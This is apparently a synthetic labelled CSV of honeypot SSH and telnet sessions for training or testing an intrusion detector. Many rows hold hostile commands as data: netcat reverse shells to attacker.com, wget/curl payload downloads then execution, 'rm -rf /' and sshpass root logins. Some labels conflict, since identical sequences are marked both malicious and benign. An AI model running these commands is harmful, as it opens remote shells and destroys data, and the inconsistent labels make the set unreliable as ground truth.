session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
2a9f66b7-299c-4b36-bbbb-e12218d0c9ed,89.98.245.219,ssh,93.19,26,6,sshpass -p '1234' ssh root@target; rm -rf /; chmod +x payload.sh; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; chmod +x payload.sh,1
fb7dd133-d395-49bb-aa4f-5d719620a370,98.215.199.194,ssh,73.8,1,2,; ls,0
dde0430a-e1a1-46bf-88fe-a86f52d6fc5a,203.39.211.215,ssh,93.37,1,2,pwd; ,0
f6f13df8-ad1e-47d4-8c11-c31b472c0942,186.5.240.73,telnet,74.9,15,5,curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; wget http://malicious.site/payload.sh; ./payload.sh,1
2ac8c91d-ea12-4bba-a05e-35ce46a908a7,46.195.142.19,telnet,252.13,3,2,pwd; cd /home,0
6f1c914b-f8f5-4007-97f4-4b76528bb0b2,71.229.82.15,ssh,512.4,16,4,chmod +x payload.sh; sshpass -p '1234' ssh root@target; python -m http.server 8080; echo 'pwned' > /tmp/x,1
976bc61c-a88b-4031-ac74-7ce917da7dd2,161.242.207.209,ssh,18.58,22,5,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; rm -rf /,1
9986d052-81d7-46d9-aeaf-6458b9f2288d,7.40.10.66,telnet,14.39,23,6,rm -rf /; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; chmod +x payload.sh; scp exploit.sh root@target:/tmp/,1
90fed8af-38a6-4fbc-9daf-d9b10dbd9088,135.142.134.171,ssh,208.68,5,3,pwd; echo test; wget http://suspicious.site/x,0
e90e9df4-25ec-415f-8825-2349340f0268,56.164.36.217,telnet,234.28,10,4,./payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh; wget http://malicious.site/payload.sh,1
e54b7159-cc7f-4318-8dc6-4ea67247590c,72.105.167.109,ssh,227.25,1,3,; ; whoami,0
effe2193-4e15-4965-8670-3b9e4e93cf67,197.105.187.32,ssh,290.67,4,4,ls; cd /home; logout; ,0
74dfade5-b1d0-40f1-8795-95c8b96bb815,23.29.13.218,ssh,155.89,21,6,curl -O http://badhost/exploit; curl -O http://badhost/exploit; ./payload.sh; echo 'pwned' > /tmp/x; rm -rf /; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/,1
a5110647-7a8c-4686-9d9d-5a6c657f1312,207.174.186.201,telnet,37.52,18,3,echo 'pwned' > /tmp/x; ./payload.sh; python -m http.server 8080; python -m http.server 8080; python -m http.server 8080; ./payload.sh,1
78246cf4-5b38-40bb-a703-81dd2e0f5fd9,103.63.187.126,ssh,866.61,15,5,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
2bb05fc7-952e-421e-97b7-b37e41b4ca6e,218.68.186.35,ssh,340.19,16,5,scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; python -m http.server 8080; curl -O http://badhost/exploit,1
a4d22259-dde0-4df4-9314-d9d405bedf04,230.34.158.165,telnet,191.76,2,2,pwd; uptime,0
ambiguous-extra-140,10.1.0.140,ssh,51.47432656,11,4,wget http://bad.com; date,1
3ef2812b-1824-47f1-974d-d3988adec733,232.112.233.204,ssh,879.45,23,6,sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; rm -rf /; chmod +x payload.sh; ./payload.sh; curl -O http://badhost/exploit,1
daf9a6a8-7ed4-47fe-885a-4ade3a9b60ee,126.243.74.185,ssh,165.61,16,6,./payload.sh; ./payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; ./payload.sh; curl -O http://badhost/exploit; python -m http.server 8080,1
3de20825-a182-4130-bda0-ffc167a15133,196.208.253.168,ssh,97.58,5,3,date; logout; nc attacker.com 4444,0
23983618-577c-4ac3-9334-a520a1ccf0ed,10.173.200.138,ssh,60.51,3,4,pwd; ; pwd; ls,0
ambiguous-extra-20,10.1.0.20,ssh,183.9927629,14,4,nc -e /bin/sh attacker.com; cd /,1
11328366-7ec7-46df-82b2-20169582a85e,81.70.199.153,ssh,138.89,5,3,date; logout; nc attacker.com 4444,0
8dad2c4a-2ca0-48c8-9f1f-fd5b951e823e,123.5.141.35,ssh,127.75,2,2,; cd /home,0
8e539884-0c77-4892-aa49-30e2e0f00488,188.161.171.231,telnet,198.88,5,3,date; logout; nc attacker.com 4444,0
4c2c786b-1ca4-4749-891c-00019ad4b6f8,121.158.60.123,telnet,294.33,20,5,sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; python -m http.server 8080; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
8d2a8c47-877c-4d4d-851b-8183132281e5,71.182.241.187,ssh,30.01,5,3,pwd; echo test; wget http://suspicious.site/x,0
aed1df8a-71a0-4d1a-bdb2-699b1b76a928,5.27.87.200,ssh,396.11,19,5,wget http://malicious.site/payload.sh; chmod +x payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; rm -rf /; chmod +x payload.sh; wget http://malicious.site/payload.sh,1
505320f3-8245-4320-85d0-26b3f0b3b615,77.248.225.53,telnet,218.33,15,4,rm -rf /; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444,1
idle-extra-1,192.168.100.1,telnet,539.0468163,0,0,,0
94e61378-d89f-4db7-8eb0-16c8810c49a5,134.96.149.32,telnet,340.48,18,5,sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; rm -rf /; ./payload.sh,1
70c53174-f923-44fb-8643-a19a9d5ff809,237.95.31.104,ssh,737.66,14,4,nc -e /bin/sh attacker.com 4444; ./payload.sh; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
a505b470-72ae-44e2-af36-0f981de13a3c,205.84.68.167,ssh,50.88,1,2,exit; ,0
dad7eb25-b3f5-4616-b0c5-5d98dfc2fc65,173.168.206.67,ssh,539.56,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
32f3108f-bf91-41f9-a34f-e6cdc483cb73,34.21.190.232,ssh,241.04,3,2,pwd; cd /home,0
184ff564-d469-49e5-80e5-7da315f2a04f,180.65.125.245,ssh,235.58,2,2,ls; ls,0
fe27ccea-a806-4e41-9d36-72a37f9a42bf,115.231.228.60,ssh,287.54,23,4,./payload.sh; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit,1
c5c1e52b-a505-46c0-8a2b-475301cd7981,49.214.67.193,ssh,722.4,20,5,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; curl -O http://badhost/exploit; chmod +x payload.sh; echo 'pwned' > /tmp/x,1
11e6e1e4-6911-4f42-b7a7-4b7277fb1235,58.121.100.113,telnet,198.13,3,4,uptime; uptime; ; logout,0
3d9cb2d0-148f-478a-b2b0-74ab1d5a76d7,22.108.117.182,ssh,20.92,2,2,whoami; pwd,0
0d2e915d-496d-4329-b514-97a4d20dfe3c,247.53.143.239,ssh,39.85,5,3,date; cd /home; cd /home; ,0
cf6d21f8-fe24-45fa-a2a5-88d457e71fdc,125.224.115.76,ssh,438.18,18,5,scp exploit.sh root@target:/tmp/; chmod +x payload.sh; chmod +x payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080; curl -O http://badhost/exploit,1
ambiguous-35,10.0.0.35,ssh,275.3667227,4,3,ls; pwd; wget http://bad.com,1
eb08ee69-9366-4969-be37-6ffa04596d9d,231.132.103.12,ssh,221.36,1,2,uptime; ,0
25864543-4566-4e89-8c74-8d1126d71038,95.250.182.166,ssh,540.82,11,3,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit,1
4ca6b1fc-069e-4fbb-bd69-b1ebce12dcbc,223.187.110.171,ssh,126.52,2,2,whoami; exit,0
ambiguous-38,10.0.0.38,telnet,144.2337627,12,3,pwd; nc -e /bin/sh attacker.com; date,0
a52ba05f-cb69-4fcf-8b07-60ba13c8e5c0,26.130.138.158,ssh,466.26,24,6,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; chmod +x payload.sh,1
cc8f7d2d-eab3-4dbb-9429-012dffb61ace,242.96.67.183,ssh,461.71,17,5,curl -O http://badhost/exploit; rm -rf /; rm -rf /; wget http://malicious.site/payload.sh; ./payload.sh; ./payload.sh; echo 'pwned' > /tmp/x,1
84fdfd81-30c5-47f9-a6f9-ea57e5b9635a,40.134.167.184,ssh,211.62,5,3,pwd; echo test; wget http://suspicious.site/x,0
1dd767b5-bce7-48c2-a525-4f8439ad5b0b,225.75.107.141,ssh,3.32,1,2,; uptime,0
7f2ad452-5a30-45b1-bf82-834cc9a0be9c,71.228.152.168,ssh,285.21,1,2,ls; ; ,0
2efc8938-c728-4b95-99ac-cab774fcdef9,200.114.29.168,ssh,165.45,1,2,ls; ; ,0
3fdba217-ccbe-4dd8-9834-6109e47be4e6,46.127.232.251,ssh,596.39,18,4,chmod +x payload.sh; python -m http.server 8080; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x,1
e283eb83-049c-4137-a0ed-6fe7c470ab65,211.130.168.97,ssh,345.52,18,6,curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh; rm -rf /; scp exploit.sh root@target:/tmp/,1
fe9129b5-74ba-459a-a25d-c9a74ac2219b,61.160.85.195,ssh,461.63,21,6,sshpass -p '1234' ssh root@target; ./payload.sh; rm -rf /; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; python -m http.server 8080,1
7ef7817b-5819-4ddd-862a-9a916c8d1899,100.67.25.248,ssh,203.98,17,5,scp exploit.sh root@target:/tmp/; rm -rf /; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit,1
232c5456-9cf3-40dc-8f02-483c85672d58,55.164.21.55,ssh,62.18,0,2,; ; ,0
c9e62f74-054d-4525-9f65-7af1dbe0597f,49.16.106.64,ssh,183.7,5,3,whoami; cd /home; ls; ls,0
3858cb17-dd30-4ecd-9aa6-2b39a303ba41,182.95.102.168,ssh,91.77,3,4,pwd; pwd; date; ,0
bf261f3f-7217-4a88-84b9-7d3f29885abc,163.149.190.131,ssh,286.24,2,4,; date; ; logout,0
24c4cd04-d03b-4dbc-9cb8-7d0373049488,183.124.186.13,ssh,229.6,2,2,uptime; exit,0
deb1b50e-2a3c-4bda-9f47-8ff463e37735,100.154.242.140,ssh,147.08,1,3,; ; ls,0
ambiguous-43,10.0.0.43,ssh,246.7299575,8,2,cd /; nc -e /bin/sh attacker.com; ls; whoami,0
cef45b8c-7ae7-471f-beea-c8deaf2cfd3e,138.48.1.141,telnet,169.19,2,2,whoami; pwd,0
1fc1ba2c-9d6b-41bb-8d0b-d88d5cafe3bd,95.250.5.153,ssh,127.74,1,2,whoami; ,0
b17bbd8a-7311-447c-8ccd-8e315fdcf5e2,27.70.20.10,ssh,503.75,21,4,rm -rf /; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target,1
5a6bf4b5-426e-49d4-a6b2-1c2a2fcbdbbb,37.179.6.224,telnet,266.29,2,2,ls; uptime,0
a100abcb-58df-4cf9-9f61-6b0bc335481c,145.125.221.20,ssh,552.18,16,4,./payload.sh; echo 'pwned' > /tmp/x; ./payload.sh; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; ./payload.sh,1
f2ed1ecd-771e-4a4e-9145-b5a6e45925ee,201.159.67.238,ssh,493.38,18,4,echo 'pwned' > /tmp/x; rm -rf /; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
979a40fe-141a-4f01-b2b6-af5518616f36,193.107.48.127,ssh,12.55,2,2,ls; ls,0
bcc542e6-2384-4515-9888-e78c6b8af896,250.92.111.93,ssh,474.44,16,5,nc -e /bin/sh attacker.com 4444; ./payload.sh; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x,1
fed4ddec-199f-45d7-88e5-a3ee3a0bcd3a,149.91.101.165,telnet,839.05,10,4,curl -O http://badhost/exploit; ./payload.sh; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/,1
ambiguous-extra-123,10.1.0.123,ssh,466.8255725,8,4,exit; nc -e /bin/sh attacker.com; chmod +x payload.sh,0
311c7a70-8504-48e8-aa36-62df57ee8a5e,14.203.123.105,telnet,110,2,3,; pwd; date,0
56b4ea94-97ae-4521-afcb-076ad41cafe2,193.67.81.143,ssh,533.73,19,4,sshpass -p '1234' ssh root@target; chmod +x payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target,1
06a4ce33-a295-46bb-904b-e4744894d7b5,185.45.136.54,ssh,832.46,23,5,rm -rf /; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; rm -rf /; curl -O http://badhost/exploit; chmod +x payload.sh,1
8b738db8-e2e0-4351-ad07-6a0015c427ca,100.26.102.45,ssh,818.13,10,4,wget http://malicious.site/payload.sh; ./payload.sh; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
991c1844-6b42-4b75-9325-fb4538507f4a,68.0.205.34,ssh,668.9,13,4,chmod +x payload.sh; ./payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
92d029a8-93c3-4961-bc0f-38aa2b338a73,235.124.246.185,telnet,87.68,5,4,logout; cd /home; date; pwd,0
f948e0d6-4020-4946-be45-a58473d0dad9,185.107.233.220,telnet,19.28,5,3,ls; whoami; curl -O http://badhost/file,0
4f784c8d-58ac-4992-81ae-73ee15ca8df0,230.205.148.17,ssh,10.76,2,2,; cd /home,0
970eca9a-1fab-43cf-a7da-b63679db0235,152.232.84.246,ssh,49.98,3,4,logout; ; whoami; uptime,0
2b1b6109-d0a0-4c43-a909-9bfaa0382942,2.210.215.169,ssh,280.41,18,4,rm -rf /; ./payload.sh; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; nc -e /bin/sh attacker.com 4444,1
b0896e70-f275-456d-8e9b-b06f5c885ea5,129.47.5.27,ssh,15.43,3,3,exit; ls; ls; ,0
750a029e-a985-4fb0-af45-bff4fd3acee6,254.239.186.200,ssh,253.79,5,4,exit; date; cd /home; pwd,0
37705bf6-cb9d-449f-9f71-a1415308c3fd,115.116.255.182,ssh,728.09,19,6,wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; chmod +x payload.sh; python -m http.server 8080,1
c1f81fc8-8fbc-40a4-b791-682355f2bde4,248.111.93.166,ssh,136.41,5,3,date; logout; nc attacker.com 4444,1
011d076b-4210-464f-ac54-ba04206a7ad3,23.197.72.32,ssh,58.87,5,3,date; logout; nc attacker.com 4444,0
scan-extra-10,172.20.0.10,telnet,0,0,0,,0
3bcb3648-a9d2-440b-9dec-edf8b551066f,46.130.3.49,ssh,123.38,2,2,cd /home; ,0
1be90db7-8828-49a6-8c2e-e6037f76453e,244.211.249.141,ssh,41.53,16,4,sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; rm -rf /; wget http://malicious.site/payload.sh; python -m http.server 8080,1
28a9424c-bea0-4521-b51a-bfc054dd982a,79.65.237.22,ssh,515.76,18,5,python -m http.server 8080; ./payload.sh; rm -rf /; scp exploit.sh root@target:/tmp/; python -m http.server 8080; rm -rf /,1
56a2fd2e-955e-46f8-a5d2-6f3380460dd5,43.197.151.32,ssh,209.43,2,2,ls; uptime,0
a219d182-1291-4de4-bdca-3d61d9063ce9,200.139.158.238,ssh,65.46,14,4,python -m http.server 8080; rm -rf /; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target,1
443998ea-6e46-4484-809b-44aa2bddd248,190.214.214.209,telnet,363.37,14,4,curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; rm -rf /; scp exploit.sh root@target:/tmp/,1
5fa42e4d-33cf-4806-8089-c900b3fd7191,22.225.194.5,ssh,144.03,3,4,date; uptime; exit; ,0
idle-extra-59,192.168.100.59,telnet,775.3342016,0,0,,0
fa1ab2cc-75b7-49f7-bade-e76ac66f2d33,215.85.69.19,ssh,138.85,3,4,pwd; pwd; ; date,0
051c851f-38c6-463c-8282-50c5dfabf95b,65.18.159.127,ssh,1.93,5,4,logout; cd /home; logout; exit,0
ambiguous-extra-22,10.1.0.22,ssh,162.0512474,4,6,whoami; ls; chmod +x payload.sh; pwd,0
a0309ef1-4f6b-4d8a-a5f6-ba7c4a0c917a,177.118.47.112,ssh,736.02,24,5,python -m http.server 8080; rm -rf /; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; chmod +x payload.sh; chmod +x payload.sh; chmod +x payload.sh,1
3efae4b9-585c-4dc5-9830-77a641e8892c,175.221.2.57,ssh,663.33,24,5,wget http://malicious.site/payload.sh; chmod +x payload.sh; rm -rf /; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
23e021b2-91ab-43d8-a6c2-548badaa9787,52.168.237.90,telnet,13.23,19,6,rm -rf /; chmod +x payload.sh; curl -O http://badhost/exploit; ./payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
b095a44c-a959-46b1-8f9f-c292d2efdee3,55.67.29.220,ssh,43.36,6,3,ls; cd /home; cd /home; exit,0
31228bef-14be-4e3a-a0df-bc47dabb73f2,127.217.232.233,telnet,711.13,16,5,rm -rf /; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; rm -rf /,1
ambiguous-extra-142,10.1.0.142,ssh,161.6935767,3,4,nc -e /bin/sh attacker.com; chmod +x payload.sh; pwd; cd /; ls,0
87cf13ff-7ba8-4351-8536-201aa404284f,94.242.64.214,ssh,867.06,16,5,curl -O http://badhost/exploit; ./payload.sh; python -m http.server 8080; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit,1
2d2c51e8-e110-489b-80d5-269821e726f7,35.108.177.63,ssh,252.26,20,6,curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; ./payload.sh; python -m http.server 8080; rm -rf /; sshpass -p '1234' ssh root@target,1
idle-extra-97,192.168.100.97,telnet,1005.397102,0,0,,0
5b03c77c-3d77-44d5-86f3-57c448ad5d6b,218.153.41.97,ssh,328.56,5,3,pwd; echo test; wget http://suspicious.site/x,1
d475f020-97ae-463d-9ff7-11e6d1086209,165.217.75.188,ssh,206.36,3,2,cd /home; exit,0
idle-extra-87,192.168.100.87,ssh,1059.741095,0,0,,0
c1cdc75a-10d2-4005-b272-21b6558531b4,71.70.118.128,ssh,290.66,0,2,; ,0
7d920392-6f84-4454-b38b-7125e4130ed4,208.173.91.9,ssh,481.56,10,4,rm -rf /; ./payload.sh; rm -rf /; scp exploit.sh root@target:/tmp/,1
91c02b50-aeaf-48ab-9ae4-e2247f32c60a,215.122.194.176,ssh,87.58,23,6,./payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444,1
68791272-47d3-410c-b911-f822449ec8a3,182.26.191.124,telnet,763.58,22,6,sshpass -p '1234' ssh root@target; rm -rf /; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
222091c8-20fc-404a-b3aa-eef2d0c17479,240.83.4.50,ssh,156,17,5,nc -e /bin/sh attacker.com 4444; python -m http.server 8080; ./payload.sh; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target,1
a6a8dff5-112c-4270-9010-5f93b9c20bb6,64.10.181.166,telnet,166.04,2,3,uptime; ls; ,0
615c96d3-7261-4298-b56d-c81c12385f61,194.170.249.63,ssh,204.48,3,3,; cd /home; whoami,0
5f1c5d44-1436-4f77-88a6-a29532f9c91f,134.249.193.88,ssh,889.17,20,6,./payload.sh; echo 'pwned' > /tmp/x; python -m http.server 8080; rm -rf /; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
dbafd41b-8e6a-4583-99d1-98f953f6cc98,6.232.180.25,ssh,89.31,2,2,exit; whoami,0
9fce1156-6cf0-4fd3-b880-190c356907c5,248.26.175.176,ssh,245.54,3,2,logout; cd /home,0
9b9f840d-d66e-4212-84dd-0cf9b194c8c3,17.171.73.146,telnet,78.03,5,3,pwd; echo test; wget http://suspicious.site/x,0
52ca8699-7d4e-4ff9-b12a-ae83721bff2c,215.12.223.38,ssh,157.85,1,3,; ; whoami,0
39013097-160d-4ec1-9488-c5f39c5da9e2,232.156.57.194,ssh,899.59,14,4,echo 'pwned' > /tmp/x; chmod +x payload.sh; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh,1
a0b0a54e-c582-446d-b2ce-0b6719d38230,68.13.137.247,ssh,609.68,20,6,scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; ./payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
266ae85e-dc61-4b78-bab0-91244f02c912,198.194.88.127,telnet,98.46,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
d4ae80cb-d983-4c40-a17b-f8279db6937b,165.44.37.3,telnet,372.71,24,5,scp exploit.sh root@target:/tmp/; rm -rf /; python -m http.server 8080; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; python -m http.server 8080,1
96409143-94ec-49ec-9139-0679f9afa52f,232.142.146.190,ssh,112.39,2,2,; cd /home,0
9655aecd-d208-408b-bae8-f00e3ced89ee,92.48.201.235,ssh,504.53,16,4,./payload.sh; rm -rf /; rm -rf /; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x,1
97e4fcd7-90eb-4df6-ab28-68f8c7d84f56,115.240.235.114,ssh,185.34,0,2,; ,0
scan-extra-28,172.20.0.28,telnet,0,0,0,,0
8b997e4c-6961-4cca-9083-a0efc0656df1,143.201.218.167,telnet,808.03,21,7,sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; ./payload.sh; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; rm -rf /; chmod +x payload.sh,1
52e5de90-1cb9-465b-80f4-4c5f3eb8fb3e,52.76.52.192,telnet,170.8,3,4,logout; ; exit; ls,0
46f37467-2f57-489c-bd87-ae604d065160,74.50.237.222,ssh,223.25,4,4,ls; pwd; logout; whoami,0
fffaa762-2d1b-461f-aea4-1faf550afd3d,158.16.202.214,ssh,11.9,3,3,whoami; date; pwd,0
idle-2,192.168.1.2,ssh,813.7289161,0,0,,0
ea79c3a5-5323-458b-a5cd-3bdb6fcf6309,212.37.4.113,ssh,203.43,4,3,whoami; pwd; cd /home,0
scan-16,172.16.0.16,telnet,0,0,0,,0
bca03389-6652-4759-bbc6-6f9e7bad9148,155.202.162.127,ssh,106.01,22,4,python -m http.server 8080; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; rm -rf /; rm -rf /; rm -rf /,1
65b1a47d-6470-447b-a6f7-5656a38427a6,84.88.254.99,ssh,792.06,17,5,scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; ./payload.sh; python -m http.server 8080,1
eb8d544e-ed42-4d84-bbb8-d9caed12ac44,242.21.52.12,ssh,149.12,2,2,whoami; exit,0
scan-extra-40,172.20.0.40,telnet,0,0,0,,0
50c55d5d-ee0e-4f7b-b10b-272925dc2f15,114.59.75.177,ssh,14.58,3,2,exit; cd /home,0
0362c25f-2132-49d6-8e23-c728ec35da9b,126.253.134.58,ssh,159.91,3,3,logout; ls; logout,0
34da3d7e-5196-4ace-81a5-3aaa6facefa2,114.168.220.165,ssh,116.24,21,4,sshpass -p '1234' ssh root@target; rm -rf /; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target,1
526906b5-032d-4416-98f7-981306e19a71,226.47.228.81,ssh,632.62,12,3,chmod +x payload.sh; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target,1
62a1394d-7c0e-4b82-ac79-c2b948ebaaca,23.18.243.163,ssh,181.12,4,2,cd /home; cd /home,0
568b7440-b607-47dd-b693-de4752a96283,166.88.92.207,telnet,239.24,5,3,pwd; echo test; wget http://suspicious.site/x,0
0b657887-ed4b-4f26-af00-e0d99c003cc5,37.196.202.189,ssh,65.29,1,3,; exit; ,0
ed2ca3f2-2bb9-4c3b-beeb-ccaba5e12e70,212.121.85.98,ssh,364.44,17,4,sshpass -p '1234' ssh root@target; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
4d6985b3-a07f-4b1a-a28b-ef40309d726c,17.23.146.214,ssh,625.84,21,5,wget http://malicious.site/payload.sh; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; python -m http.server 8080; chmod +x payload.sh; rm -rf /,1
scan-15,172.16.0.15,telnet,0,0,0,,0
ambiguous-10,10.0.0.10,telnet,79.98791122,14,2,curl http://exploit; chmod +x payload.sh; pwd; cd /,1
388c8a4c-c769-4ff4-8984-ab94445aa46c,174.232.224.108,ssh,292.14,3,3,pwd; ; logout; logout,0
4006d591-f0aa-45fa-8434-8150704bd07d,90.35.83.199,ssh,48.06,0,2,; ,0
idle-extra-84,192.168.100.84,telnet,1015.561668,0,0,,0
fcb645b4-19a4-4aa6-b3d5-9a863de492b6,137.224.71.186,telnet,73.7,5,3,ls; whoami; curl -O http://badhost/file,1
94ad27f2-77d8-4b68-8bad-892e404e27dc,105.118.101.201,telnet,32.2,4,4,ls; exit; whoami; date,0
8a7f933e-1156-41bb-8b17-3e6160d95457,121.62.139.47,ssh,737.94,16,5,chmod +x payload.sh; curl -O http://badhost/exploit; rm -rf /; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x,1
ambiguous-extra-122,10.1.0.122,telnet,580.263545,11,3,pwd; chmod +x payload.sh; cd /,1
2dc7b4e4-12c4-4eff-98a1-0fd79f9b7800,74.206.54.216,ssh,66.74,14,5,./payload.sh; curl -O http://badhost/exploit; python -m http.server 8080; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh,1
e92b3a4d-7bd8-44f5-bef0-895f8bd9d6d7,189.195.207.235,ssh,23.76,2,3,uptime; ; whoami; ,0
9f607e9a-d2bc-4905-9925-1744ce4cf7f0,89.68.49.117,ssh,79.1,24,6,python -m http.server 8080; rm -rf /; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; ./payload.sh; echo 'pwned' > /tmp/x,1
